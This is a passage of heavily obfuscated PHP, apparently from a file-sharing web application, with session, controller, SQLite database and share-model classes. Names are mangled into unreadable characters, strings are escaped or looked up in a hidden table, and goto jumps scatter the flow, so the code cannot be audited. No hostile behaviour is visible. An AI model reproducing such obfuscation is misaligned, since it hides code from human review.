$_SERVER[ñ÷§¡å]; recursion_dir(PLUGIN_DIR, $ŒªÛ·Óş, $ËĞã÷«, 0); foreach ($ŒªÛ·Óş as $° …ïİØ) { $…ïœ‰Üß = get_path_this($° …ïİØ); if (isset($´â«êÖ¬[$…ïœ‰Üß]) || !file_exists($° …ïİØ . $¥Çü‚Æï[1969]) || !file_exists($° …ïİØ . $¥Çü‚Æï[1958])) { continue; } Hook::apply($…ïœ‰Üß . $¥Çü‚Æï[1963]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\x6d\137\x73\145\x73\x73\151\157\x6e"; public function get($ÉÙÃ¨ŒÄ) { $ÒàÌìê“ =& $_SERVER[ñ÷§¡å]; $ÜûÚáÕô = $this->where(array($ÒàÌìê“[1970] => $ÉÙÃ¨ŒÄ))->find(); if (!is_array($ÜûÚáÕô)) { return !1; } return $ÜûÚáÕô[$ÒàÌìê“[768]]; } public function set($Å¼®Ë°é, $û±ö±£â, $åö‚ûï = 3600) { $ÏÎìÛ” =& $_SERVER[ñ÷§¡å]; $—Â¡„¹¨ = array($ÏÎìÛ”[1970] => $Å¼®Ë°é, $ÏÎìÛ”[1874] => $û±ö±£â, $ÏÎìÛ”[1971] => $åö‚ûï + time()); if (Session::get($ÏÎìÛ”[1972])) { $—Â¡„¹¨[$ÏÎìÛ”[1663]] = Session::get($ÏÎìÛ”[1972]); } else { $—Â¡„¹¨[$ÏÎìÛ”[1663]] = 0; } if ($this->get($Å¼®Ë°é)) { return $this->where(array($ÏÎìÛ”[1970] => $Å¼®Ë°é))->save($—Â¡„¹¨); } else { return $this->add($—Â¡„¹¨, array(), !0); } } public function remove($‹¦ïéü) { return $this->where(array($_SERVER[ñ÷§¡å][1970] => $‹¦ïéü))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ñ÷§¡å][1973] . time())->delete(); } } goto FÊ¡–§Ë; FæˆİÇ³‚Ù: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $±ç¤×³ =& $_SERVER[ñ÷§¡å]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$±ç¤×³[6]] =& $config; $this->values[$±ç¤×³[7]] =& $in; $this->tpl = TEMPLATE . MOD . $±ç¤×³[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($€àÛ‡¥) { if (1 === func_num_args()) { $this->{$€àÛ‡¥} = new $€àÛ‡¥(); } else { $­Ï¾ÆÒá = new ReflectionClass($€àÛ‡¥); $†ï‚—’Ö = func_get_args(); array_shift($†ï‚—’Ö); $this->{$€àÛ‡¥} = $­Ï¾ÆÒá->newInstanceArgs($†ï‚—’Ö); } return $this->{$€àÛ‡¥}; } public function routeBind($Üä¹Ñ°õ, $˜Ó¨…’‡, $Òµí Øµ = 3) { $ç¥ÅíòÄ =& $_SERVER[ñ÷§¡å]; $ùÑ¢™ªÄ = $this->in[$ç¥ÅíòÄ[9]]; $Üä¹Ñ°õ = str_replace($ç¥ÅíòÄ[10], $ç¥ÅíòÄ[11], trim(trim($Üä¹Ñ°õ, $ç¥ÅíòÄ[8]), $ç¥ÅíòÄ[12])); if (!$Üä¹Ñ°õ || count($ùÑ¢™ªÄ) <= $Òµí Øµ) { return !1; } $ˆæşıŠÏ = !0; $•ã÷íİ = explode($ç¥ÅíòÄ[8], $Üä¹Ñ°õ); for ($ÖüğÕ„ = 0; $ÖüğÕ„ < count($•ã÷íİ); $ÖüğÕ„++) { if ($•ã÷íİ[$ÖüğÕ„] != $ùÑ¢™ªÄ[$Òµí Øµ + $ÖüğÕ„]) { $ˆæşıŠÏ = !1; break; } } if (!$ˆæşıŠÏ) { return; } call_user_func_array(array($this, $˜Ó¨…’‡), array()); } public function routeArgs($³µë‘„ç = 3) { $±¶¥€İ = $this->in[$_SERVER[ñ÷§¡å][9]]; if (count($±¶¥€İ) <= $³µë‘„ç) { return array(); } $»²ë¤ß = array(); for ($©¨¨½Š = $³µë‘„ç; $©¨¨½Š < count($±¶¥€İ); $©¨¨½Š += 2) { $»²ë¤ß[$±¶¥€İ[$©¨¨½Š]] = $±¶¥€İ[$©¨¨½Š + 1]; $this->in[$±¶¥€İ[$©¨¨½Š]] = $±¶¥€İ[$©¨¨½Š + 1]; } return $»²ë¤ß; } protected function assign($Ç¥Ô½¥£, $…°²Ùğ‰) { $this->values[$Ç¥Ô½¥£] = $…°²Ùğ‰; } protected function display($‘šøİä˜) { ob_end_clean(); extract($this->values); require $this->tpl . $‘šøİä˜; } } class DbSqliteBase extends Db { public function __construct($ÈóÏÆÑ· = '') { $€×“£µƒ =& $_SERVER[ñ÷§¡å]; if (!extension_loaded($€×“£µƒ[13])) { think_exception(think_lang($€×“£µƒ[14]) . $€×“£µƒ[15]); } if (!empty($ÈóÏÆÑ·)) { if (!isset($ÈóÏÆÑ·[$€×“£µƒ[16]])) { $ÈóÏÆÑ·[$€×“£µƒ[16]] = 438; } $this->config = $ÈóÏÆÑ·; if (empty($this->config[$€×“£µƒ[17]])) { $this->config[$€×“£µƒ[17]] = array(); } } } public function connect($÷£ÑŸöô = '', $ñ– Ó´ê = 0) { $€ÆØªü³ =& $_SERVER[ñ÷§¡å]; if (!isset($this->linkID[$ñ– Ó´ê])) { if (empty($÷£ÑŸöô)) { $÷£ÑŸöô = $this->config; } $— °ÅÃÒ = !empty($÷£ÑŸöô[$€ÆØªü³[17]][$€ÆØªü³[18]]) ? $÷£ÑŸöô[$€ÆØªü³[17]][$€ÆØªü³[18]] : $this->pconnect; $Ğ¢§×ù± = $— °ÅÃÒ ? $€ÆØªü³[19] : $€ÆØªü³[20]; $this->linkID[$ñ– Ó´ê] = $Ğ¢§×ù±($÷£ÑŸöô[$€ÆØªü³[21]], $÷£ÑŸöô[$€ÆØªü³[16]]); if (!$this->linkID[$ñ– Ó´ê]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ñ– Ó´ê], 30000); if (1 != think_config($€ÆØªü³[22])) { unset($this->config); } } return $this->linkID[$ñ– Ó´ê]; } public function free() { $this->queryID = null; } public function query($½ÕÄ¡ì) { $ÊÙ‘­¡í =& $_SERVER[ñ÷§¡å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $½ÕÄ¡ì; if ($this->queryID) { $this->free(); } think_action_status($ÊÙ‘­¡í[23], 1); think_status($ÊÙ‘­¡í[24]); $this->queryID = sqlite_query($this->_linkID, $½ÕÄ¡ì); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ıâ¬Ø”À = $this->getAll(); return $ıâ¬Ø”À; } } public function execute($ıË¬‘) { $ëòÀƒ€ =& $_SERVER[ñ÷§¡å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ıË¬‘; if ($this->queryID) { $this->free(); } think_action_status($ëòÀƒ€[25], 1); think_status($ëòÀƒ€[24]); $ûÆÕöøá = sqlite_exec($this->_linkID, $ıË¬‘); $this->debug(); if (!1 === $ûÆÕöøá) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ñ÷§¡å][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $•® Öƒ = sqlite_query($this->_linkID, $_SERVER[ñ÷§¡å][27]); if (!$•® Öƒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ù¶¬÷Î = sqlite_query($this->_linkID, $_SERVER[ñ÷§¡å][28]); if (!$Ù¶¬÷Î) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Šçòô’š = array(); if ($this->numRows > 0) { for ($Ùº´ïú = 0; $Ùº´ïú < $this->numRows; $Ùº´ïú++) { $Šçòô’š[$Ùº´ïú] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Šçòô’š; } public function getFields($ñóŞáéç) { $Ûª ªä˜ =& $_SERVER[ñ÷§¡å]; $´¿­ôîª = $this->query($Ûª ªä˜[29] . $ñóŞáéç . $Ûª ªä˜[30]); $„‰ëğ­ = array(); if ($´¿­ôîª) { foreach ($´¿­ôîª as $Ş½ûŠßµ => $Ûïù¸İñ) { $„‰ëğ­[$Ûïù¸İñ[$Ûª ªä˜[31]]] = array($Ûª ªä˜[32] => $Ûïù¸İñ[$Ûª ªä˜[31]], $Ûª ªä˜[33] => $Ûïù¸İñ[$Ûª ªä˜[34]], $Ûª ªä˜[35] => (bool) ($Ûïù¸İñ[$Ûª ªä˜[36]] === $Ûª ªä˜[12]), $Ûª ªä˜[37] => $Ûïù¸İñ[$Ûª ªä˜[38]], $Ûª ªä˜[39] => strtolower($Ûïù¸İñ[$Ûª ªä˜[40]]) == $Ûª ªä˜[41], $Ûª ªä˜[42] => strtolower($Ûïù¸İñ[$Ûª ªä˜[43]]) == $Ûª ªä˜[44]); } } return $„‰ëğ­; } public function getTables($”—¼ğÄ = '') { $¡ÖÕÃ«ñ =& $_SERVER[ñ÷§¡å]; $Ùü°î× = $this->query($¡ÖÕÃ«ñ[45] . $¡ÖÕÃ«ñ[46] . $¡ÖÕÃ«ñ[47]); $ßìú¤¾ = array(); foreach ($Ùü°î× as $¥çï• => $Óƒş) { $ßìú¤¾[$¥çï•] = current($Óƒş); } return $ßìú¤¾; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Äñ³¢Õ =& $_SERVER[ñ÷§¡å]; $×¼Éõ¯ = sqlite_last_error($this->_linkID); $this->error = $×¼Éõ¯ . $Äñ³¢Õ[4] . sqlite_error_string($×¼Éõ¯); if ($Äñ³¢Õ[12] != $this->queryStr) { $this->error .= LNG($Äñ³¢Õ[48]) . $this->queryStr; } think_trace($this->error, $Äñ³¢Õ[12], $Äñ³¢Õ[49]); return $this->error; } public function escapeString($¾âñ§¡¼) { return sqlite_escape_string($¾âñ§¡¼); } public function parseLimit($Ü…íĞ¤) { $¹¹˜ÎÓ‘ =& $_SERVER[ñ÷§¡å]; $“ãƒ÷Á¶ = $¹¹˜ÎÓ‘[12]; if (!empty($Ü…íĞ¤)) { $Ü…íĞ¤ = explode($¹¹˜ÎÓ‘[50], $Ü…íĞ¤); if (count($Ü…íĞ¤) > 1) { $“ãƒ÷Á¶ .= $¹¹˜ÎÓ‘[51] . $Ü…íĞ¤[1] . $¹¹˜ÎÓ‘[52] . $Ü…íĞ¤[0] . $¹¹˜ÎÓ‘[53]; } else { $“ãƒ÷Á¶ .= $¹¹˜ÎÓ‘[51] . $Ü…íĞ¤[0] . $¹¹˜ÎÓ‘[53]; } } return $“ãƒ÷Á¶; } } class DbSqlite3Base extends Db { public function __construct($½ŠëĞ“ = '') { $ß„Ôåìç =& $_SERVER[ñ÷§¡å]; if (!class_exists($ß„Ôåìç[54])) { think_exception(think_lang($ß„Ôåìç[14]) . $ß„Ôåìç[55]); } if (!empty($½ŠëĞ“)) { if (!isset($½ŠëĞ“[$ß„Ôåìç[16]])) { $½ŠëĞ“[$ß„Ôåìç[16]] = 438; } $this->config = $½ŠëĞ“; if (empty($this->config[$ß„Ôåìç[17]])) { $this->config[$ß„Ôåìç[17]] = array(); } } } public function connect($ï’“¦«ó = '', $¯ËõÔÃ = 0) { $àìœÉìı =& $_SERVER[ñ÷§¡å]; if (!isset($this->linkID[$¯ËõÔÃ])) { if (empty($ï’“¦«ó)) { $ï’“¦«ó = $this->config; } $this->linkID[$¯ËõÔÃ] = new SQLite3($ï’“¦«ó[$àìœÉìı[21]]); if (!$this->linkID[$¯ËõÔÃ]) { think_exception($this->linkID[$¯ËõÔÃ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¯ËõÔÃ]->busyTimeout(30000); if (1 != think_config($àìœÉìı[22])) { unset($this->config); } } return $this->linkID[$¯ËõÔÃ]; } public function free() { $this->queryID = null; } public function query($ğÉõÁ½ƒ) { $ê‡ÜŞÕí =& $_SERVER[ñ÷§¡å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ğÉõÁ½ƒ; if ($this->queryID) { $this->free(); } think_action_status($ê‡ÜŞÕí[23], 1); think_status($ê‡ÜŞÕí[24]); $this->queryID = $this->_linkID->query($ğÉõÁ½ƒ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $£§ÀÖ©Á = $this->getAll(); $this->numRows = count($£§ÀÖ©Á); return $£§ÀÖ©Á; } } public function execute($Æ–êÚÁ‘) { $„µ’ˆ“‘ =& $_SERVER[ñ÷§¡å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Æ–êÚÁ‘; if ($this->queryID) { $this->free(); } think_action_status($„µ’ˆ“‘[25], 1); think_status($„µ’ˆ“‘[24]); $ Î©ãŠê = $this->_linkID->exec($Æ–êÚÁ‘); $this->debug(); if (!1 === $ Î©ãŠê) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ñ÷§¡å][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Å™¸üúÆ = $this->_linkID->query($_SERVER[ñ÷§¡å][27]); if (!$Å™¸üúÆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ú‹š¦Æè = $this->_linkID->query($_SERVER[ñ÷§¡å][28]); if (!$Ú‹š¦Æè) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $“òÄ†æ = array(); while ($’¥ş¯ÜÉ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $“òÄ†æ[] = $’¥ş¯ÜÉ; } $this->queryID->reset(); return $“òÄ†æ; } public function getFields($Ë×²´ôü) { $…Â¼Áòø =& $_SERVER[ñ÷§¡å]; $ôÍŒÑµ› = $this->query($…Â¼Áòø[29] . $Ë×²´ôü . $…Â¼Áòø[30]); $èÅ“ôÚ­ = array(); if ($ôÍŒÑµ›) { foreach ($ôÍŒÑµ› as $şÓ²ĞùÊ => $‚™÷“Œ³) { $èÅ“ôÚ­[$‚™÷“Œ³[$…Â¼Áòø[32]]] = array($…Â¼Áòø[32] => $‚™÷“Œ³[$…Â¼Áòø[32]], $…Â¼Áòø[33] => $‚™÷“Œ³[$…Â¼Áòø[33]], $…Â¼Áòø[35] => (bool) ($‚™÷“Œ³[$…Â¼Áòø[35]] === $…Â¼Áòø[12]), $…Â¼Áòø[37] => $‚™÷“Œ³[$…Â¼Áòø[56]], $…Â¼Áòø[39] => (bool) $‚™÷“Œ³[$…Â¼Áòø[57]], $…Â¼Áòø[42] => (bool) $‚™÷“Œ³[$…Â¼Áòø[57]]); } } return $èÅ“ôÚ­; } public function getTables($Íòƒè¸ = '') { $ùˆ•×³Ù =& $_SERVER[ñ÷§¡å]; $»¼¹ó»Ã = $this->query($ùˆ•×³Ù[45] . $ùˆ•×³Ù[46] . $ùˆ•×³Ù[47]); $¾«„Ûß = array(); foreach ($»¼¹ó»Ã as $ÎèÉÉÅ€ => $â™ğß°´) { $¾«„Ûß[$ÎèÉÉÅ€] = current($â™ğß°´); } return $¾«„Ûß; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¸ó©â‚¦ =& $_SERVER[ñ÷§¡å]; $this->error = $this->_linkID->lastErrorMsg(); if ($¸ó©â‚¦[12] != $this->queryStr) { $this->error .= LNG($¸ó©â‚¦[48]) . $this->queryStr; } think_trace($this->error, $¸ó©â‚¦[12], $¸ó©â‚¦[49]); return $this->error; } public function escapeString($™ËàÄÛŞ) { $˜ğ¸¨Ø› =& $_SERVER[ñ÷§¡å]; if ($this->_linkID) { return $this->_linkID->escapeString($™ËàÄÛŞ); } return str_ireplace($˜ğ¸¨Ø›[58], $˜ğ¸¨Ø›[59], $™ËàÄÛŞ); } public function parseLimit($¿¦¼¸úª) { $¢Ú¿îƒÖ =& $_SERVER[ñ÷§¡å]; $Í»»‘Ó· = $¢Ú¿îƒÖ[12]; if (!empty($¿¦¼¸úª)) { $¿¦¼¸úª = explode($¢Ú¿îƒÖ[50], $¿¦¼¸úª); if (count($¿¦¼¸úª) > 1) { $Í»»‘Ó· .= $¢Ú¿îƒÖ[51] . $¿¦¼¸úª[1] . $¢Ú¿îƒÖ[52] . $¿¦¼¸úª[0] . $¢Ú¿îƒÖ[53]; } else { $Í»»‘Ó· .= $¢Ú¿îƒÖ[51] . $¿¦¼¸úª[0] . $¢Ú¿îƒÖ[53]; } } return $Í»»‘Ó·; } } goto AÇïñ“ö«; FÊ¡–§Ë: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\162\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\x54\x69\155\x65", "\x74\x69\155\145", "\151\156\x73\145\162\x74\54\x75\160\x64\141\x74\145", "\146\165\156\x63\x74\x69\x6f\156"), array("\x63\162\145\141\x74\145\x54\151\155\x65", "\164\151\x6d\x65", "\x69\156\x73\x65\x72\164", "\x66\165\156\x63\164\151\x6f\x6e"), array("\x6f\160\164\151\x6f\156\163", '', "\151\x6e\x73\145\x72\x74\54\165\160\x64\141\164\x65\x2c\163\145\x6c\x65\x63\164", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($ãªŸ¤§É) { $€êüŞ— =& $_SERVER[ñ÷§¡å]; $šû½ß³† = isset($ãªŸ¤§É[0]) ? $ãªŸ¤§É[0] : !1; return array($€êüŞ—[1974] => array(USER_ID, $€êüŞ—[1975]), $€êüŞ—[1915] => array($šû½ß³†, $€êüŞ—[1976])); } protected function listSimple() { $à¤ÁÄ×Š = array($_SERVER[ñ÷§¡å][1663] => USER_ID); $§½½·ŒÇ = $this->field($this->fieldList)->where($à¤ÁÄ×Š)->select(); return $§½½·ŒÇ ? $§½½·ŒÇ : array(); } protected function getInfo($Ã³á®›­, $ş£®›¸¿ = false) { $­‡ŒÉÍ¶ =& $_SERVER[ñ÷§¡å]; if ($ş£®›¸¿) { return $this->_getShareInfo(array($­‡ŒÉÍ¶[498] => $Ã³á®›­)); } $óã·–¢¥ = $this->cacheFunctionGet($­‡ŒÉÍ¶[1917], $Ã³á®›­); return $óã·–¢¥; } public function getInfoByHash($ù¹ßä¤¢) { return $this->_getShareInfo(array($_SERVER[ñ÷§¡å][500] => $ù¹ßä¤¢)); } public function getInfoByPath($Ûş£¬Öõ) { $œ ößŒÔ =& $_SERVER[ñ÷§¡å]; $ÔíåØ‘¿ = array($œ ößŒÔ[1663] => USER_ID, $œ ößŒÔ[411] => $Ûş£¬Öõ); return $this->_getShareInfo($ÔíåØ‘¿); } public function getInfoBySourcePath($ß±ÔíÕ‘) { $×€ì¹® =& $_SERVER[ñ÷§¡å]; $¦‘Ÿ­…à = array($×€ì¹®[1663] => USER_ID, $×€ì¹®[1183] => $ß±ÔíÕ‘); return $this->_getShareInfo($¦‘Ÿ­…à); } private function _getShareInfo($®…ô¨àÊ) { $İ†ÔÒä„ =& $_SERVER[ñ÷§¡å]; $ß®ÇšµÇ = $this->where($®…ô¨àÊ)->find(); if (!$ß®ÇšµÇ) { return !1; } $®…ô¨àÊ = array($İ†ÔÒä„[498] => $ß®ÇšµÇ[$İ†ÔÒä„[498]]); $¹ñûÉé = $İ†ÔÒä„[1977]; $¦¸Ú’ğ = Model($İ†ÔÒä„[611])->order($İ†ÔÒä„[408])->field($¹ñûÉé)->where($®…ô¨àÊ)->select(); if ($ß®ÇšµÇ[$İ†ÔÒä„[411]] == $İ†ÔÒä„[207]) { $ß®ÇšµÇ[$İ†ÔÒä„[96]] = IO::info($ß®ÇšµÇ[$İ†ÔÒä„[1183]]); } else { $ß®ÇšµÇ[$İ†ÔÒä„[96]] = Model($İ†ÔÒä„[1334])->pathInfo($ß®ÇšµÇ[$İ†ÔÒä„[411]]); } $ß®ÇšµÇ[$İ†ÔÒä„[1978]] = $¦¸Ú’ğ; return $ß®ÇšµÇ; } protected function getInfoAuth($½Æ¨ÚäÖ) { $ÆÓÙàÓÍ =& $_SERVER[ñ÷§¡å]; $÷¬èÜÈ« = $this->getInfo($½Æ¨ÚäÖ); if ($÷¬èÜÈ«[$ÆÓÙàÓÍ[1663]] == USER_ID) { $÷¬èÜÈ«[$ÆÓÙàÓÍ[422]] = $÷¬èÜÈ«[$ÆÓÙàÓÍ[96]][$ÆÓÙàÓÍ[422]]; } else { $÷¬èÜÈ«[$ÆÓÙàÓÍ[422]] = Model($ÆÓÙàÓÍ[511])->authMake($÷¬èÜÈ«[$ÆÓÙàÓÍ[1978]]); } return $÷¬èÜÈ«; } protected function listData($·ôŸÕÉ™ = null, $˜ÎÌòµ› = 300) { $°‹à…‘Ú =& $_SERVER[ñ÷§¡å]; $Ì²¬»¨ = array(array($°‹à…‘Ú[503] => array($°‹à…‘Ú[1019], 0), $°‹à…‘Ú[505] => array($°‹à…‘Ú[1019], 0), $°‹à…‘Ú[1979] => $°‹à…‘Ú[1933])); if ($·ôŸÕÉ™ == $°‹à…‘Ú[1980]) { $Ì²¬»¨ = array($°‹à…‘Ú[503] => 1); } else { if ($·ôŸÕÉ™ == $°‹à…‘Ú[1168]) { $Ì²¬»¨ = array($°‹à…‘Ú[505] => 1); } } $Ì²¬»¨[$°‹à…‘Ú[1663]] = USER_ID; $—õ§ìŸƒ = $this->where($Ì²¬»¨)->selectPage($˜ÎÌòµ›); return $—õ§ìŸƒ; } protected function listToMe($úåöÔëë = 300) { $ßœ·½¾ =& $_SERVER[ñ÷§¡å]; $àƒ¦õ« = Model($ßœ·½¾[1981])->userGroupParents(USER_ID); $”Ä‚íù = array($ßœ·½¾[595] => SourceModel::TYPE_USER, $ßœ·½¾[514] => USER_ID); if ($àƒ¦õ«) { $”Ä‚íù = array(array($ßœ·½¾[595] => SourceModel::TYPE_USER, $ßœ·½¾[514] => USER_ID), array($ßœ·½¾[595] => SourceModel::TYPE_GROUP, $ßœ·½¾[514] => array($ßœ·½¾[7], $àƒ¦õ«)), $ßœ·½¾[1979] => $ßœ·½¾[1933]); } $ú¯­êËÃ = Model($ßœ·½¾[611])->where($”Ä‚íù)->selectPage($úåöÔëë); $®¨ºç = array_to_keyvalue_group($ú¯­êËÃ[$ßœ·½¾[378]], $ßœ·½¾[498]); if (!$®¨ºç) { return $ú¯­êËÃ; } $ĞéüÁœ = $ßœ·½¾[1982]; $”Ä‚íù = array($ßœ·½¾[498] => array($ßœ·½¾[427], array_keys($®¨ºç)), $ßœ·½¾[1663] => array($ßœ·½¾[1021], $ßœ·½¾[207])); $Ô«®ÛÆ£ = $this->field($ĞéüÁœ)->where($”Ä‚íù)->select(); foreach ($Ô«®ÛÆ£ as $«šÏğ¡ => &$ãÍğÕÊÂ) { $ãÍğÕÊÂ[$ßœ·½¾[1978]] = $®¨ºç[$ãÍğÕÊÂ[$ßœ·½¾[498]]]; } unset($ãÍğÕÊÂ); $¦ÌõŸÑ = array($ßœ·½¾[1983] => $Ô«®ÛÆ£, $ßœ·½¾[1984] => $ú¯­êËÃ[$ßœ·½¾[375]]); return $¦ÌõŸÑ; } protected function shareAdd($¯¢÷÷©Å, $İá¿¥¹¿) { $üêêó«ß =& $_SERVER[ñ÷§¡å]; $ñ¥°âÀ = $this->_addShareData($¯¢÷÷©Å, $İá¿¥¹¿); if (!empty($İá¿¥¹¿[$üêêó«ß[1985]])) { $this->_shareAuthSet($ñ¥°âÀ, $İá¿¥¹¿[$üêêó«ß[1985]]); } $this->shareEventAdd($¯¢÷÷©Å, $İá¿¥¹¿, $üêêó«ß[1171]); return $ñ¥°âÀ; } protected function shareAddSystem($·×†ò¦™, $èÒèÂ•) { $Ö©¿Îš¨ =& $_SERVER[ñ÷§¡å]; $ö•ô‡„¼ = $this->_addShareData($·×†ò¦™, $èÒèÂ•, $Ö©¿Îš¨[1283]); $this->_shareAuthSet($ö•ô‡„¼, $èÒèÂ•[$Ö©¿Îš¨[1985]]); return $ö•ô‡„¼; } private function shareEventAdd($ğ³šŞ­è, $ö›úÖÅ–, $Å¼ÍªÆŠ = "\141\144\x64") { $½ğ‹Öü¡ =& $_SERVER[ñ÷§¡å]; if (!$ğ³šŞ­è || $ğ³šŞ­è == $½ğ‹Öü¡[207]) { return; } if ($Å¼ÍªÆŠ == $½ğ‹Öü¡[1171]) { if ($ö›úÖÅ–[$½ğ‹Öü¡[503]] == $½ğ‹Öü¡[98]) { Model($½ğ‹Öü¡[579])->eventShare($ğ³šŞ­è, $½ğ‹Öü¡[1986]); } if ($ö›úÖÅ–[$½ğ‹Öü¡[505]] == $½ğ‹Öü¡[98]) { Model($½ğ‹Öü¡[579])->eventShare($ğ³šŞ­è, $½ğ‹Öü¡[1987]); } return; } $éÄû‰®Â = $this->getInfoByPath($ğ³šŞ­è); $ °İèÊ = $½ğ‹Öü¡[1988]; if ($éÄû‰®Â[$½ğ‹Öü¡[503]] == $½ğ‹Öü¡[207] && $ö›úÖÅ–[$½ğ‹Öü¡[503]] == $½ğ‹Öü¡[98]) { $ °İèÊ = $½ğ‹Öü¡[1986]; } if ($éÄû‰®Â[$½ğ‹Öü¡[503]] == $½ğ‹Öü¡[98] && $ö›úÖÅ–[$½ğ‹Öü¡[503]] == $½ğ‹Öü¡[207]) { $ °İèÊ = $½ğ‹Öü¡[1989]; } if ($éÄû‰®Â[$½ğ‹Öü¡[505]] == $½ğ‹Öü¡[207] && $ö›úÖÅ–[$½ğ‹Öü¡[505]] == $½ğ‹Öü¡[98]) { $ °İèÊ = $½ğ‹Öü¡[1987]; } if ($éÄû‰®Â[$½ğ‹Öü¡[505]] == $½ğ‹Öü¡[98] && $ö›úÖÅ–[$½ğ‹Öü¡[505]] == $½ğ‹Öü¡[207]) { $ °İèÊ = $½ğ‹Öü¡[1990]; } Model($½ğ‹Öü¡[579])->eventShare($ğ³šŞ­è, $ °İèÊ); return; } private function _addShareData($—³‚³İŞ, $µ¬ÃÙ³Õ = array(), $ÓşÌï˜¢ = false) { $¹ò¤©½‚ =& $_SERVER[ñ÷§¡å]; $¬ˆàœ¯Œ = $ÓşÌï˜¢ == $¹ò¤©½‚[1283] ? 0 : USER_ID; $ıÙí–Õ„ = array($¹ò¤©½‚[426] => $—³‚³İŞ, $¹ò¤©½‚[1654] => $¬ˆàœ¯Œ); if ($—³‚³İŞ == 0) { $ıÙí–Õ„ = array($¹ò¤©½‚[1991] => $µ¬ÃÙ³Õ[$¹ò¤©½‚[1183]], $¹ò¤©½‚[1654] => $¬ˆàœ¯Œ); } if ($íÆ–û²Ò = $this->where($ıÙí–Õ„)->find()) { return $íÆ–û²Ò[$¹ò¤©½‚[498]]; } if ($—³‚³İŞ == 0) { $ ‚Öş“ = array($¹ò¤©½‚[32] => get_path_this($µ¬ÃÙ³Õ[$¹ò¤©½‚[94]])); } else { $ ‚Öş“ = Model($¹ò¤©½‚[838])->sourceInfo($—³‚³İŞ); if (!$ ‚Öş“) { return !1; } } if (!$µ¬ÃÙ³Õ[$¹ò¤©½‚[1562]]) { $µ¬ÃÙ³Õ[$¹ò¤©½‚[1562]] = $ ‚Öş“[$¹ò¤©½‚[32]]; } $¸¬‡ ”ì = array($¹ò¤©½‚[1654] => $¬ˆàœ¯Œ, $¹ò¤©½‚[426] => $—³‚³İŞ, $¹ò¤©½‚[1562] => $¹ò¤©½‚[12], $¹ò¤©½‚[503] => 0, $¹ò¤©½‚[505] => 0, $¹ò¤©½‚[1183] => $¹ò¤©½‚[12], $¹ò¤©½‚[316] => $¹ò¤©½‚[12], $¹ò¤©½‚[896] => $¹ò¤©½‚[12], $¹ò¤©½‚[1992] => 0, $¹ò¤©½‚[1993] => 0, $¹ò¤©½‚[506] => 0, $¹ò¤©½‚[507] => $¹ò¤©½‚[12], $¹ò¤©½‚[500] => $¹ò¤©½‚[12]); $ŠÉñ² = explode($¹ò¤©½‚[50], $¹ò¤©½‚[1994]); foreach ($ŠÉñ² as $¡Ÿ·†ä™) { if (!isset($µ¬ÃÙ³Õ[$¡Ÿ·†ä™])) { continue; } $¸¬‡ ”ì[$¡Ÿ·†ä™] = $µ¬ÃÙ³Õ[$¡Ÿ·†ä™]; } $æ¯ò„Â = $this->add($¸¬‡ ”ì); $‡ñ± ˜ = array($¹ò¤©½‚[500] => short_id($æ¯ò„Â)); $this->where(array($¹ò¤©½‚[497] => $æ¯ò„Â))->save($‡ñ± ˜); return $æ¯ò„Â; } private function _shareAuthSet($›Û›æ»·, $Òöó¢Íæ) { $ŸŒ£ãÁö =& $_SERVER[ñ÷§¡å]; if (!is_array($Òöó¢Íæ)) { return !1; } $¤›¹È„ = Model($ŸŒ£ãÁö[1943]); $¤›¹È„->where(array($ŸŒ£ãÁö[498] => $›Û›æ»·))->delete(); $ÇÇãå‰ = array(); foreach ($Òöó¢Íæ as $Óô´Úîé) { $ÊŞÔ¶› = SourceModel::TYPE_USER; if ($Óô´Úîé[$ŸŒ£ãÁö[420]] == SourceModel::TYPE_GROUP) { $ÊŞÔ¶› = SourceModel::TYPE_GROUP; } $ŞùÅÌú = array($ŸŒ£ãÁö[498] => $›Û›æ»·, $ŸŒ£ãÁö[420] => $ÊŞÔ¶›, $ŸŒ£ãÁö[514] => intval($Óô´Úîé[$ŸŒ£ãÁö[514]]), $ŸŒ£ãÁö[1939] => 0, $ŸŒ£ãÁö[1995] => -1); if 